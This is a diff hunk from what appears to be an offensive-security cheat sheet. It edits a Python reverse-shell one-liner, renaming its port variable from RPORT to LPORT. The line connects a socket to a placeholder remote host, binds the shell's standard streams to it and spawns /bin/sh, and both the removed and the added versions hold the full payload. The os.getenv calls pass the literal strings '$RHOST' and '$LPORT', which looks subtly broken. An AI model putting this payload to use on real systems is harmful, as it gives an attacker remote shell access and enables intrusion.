@@ -139,7 +139,7 @@ $ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6
 ###### 2.2.2.2.1 - IPv4
 
 ```
-$ export RHOST="<IP>";export RPORT=<PORT>; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+$ export RHOST="<IP>";export LPORT=<PORT>; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$LPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 ```
 
 ### 2.3 - Windows
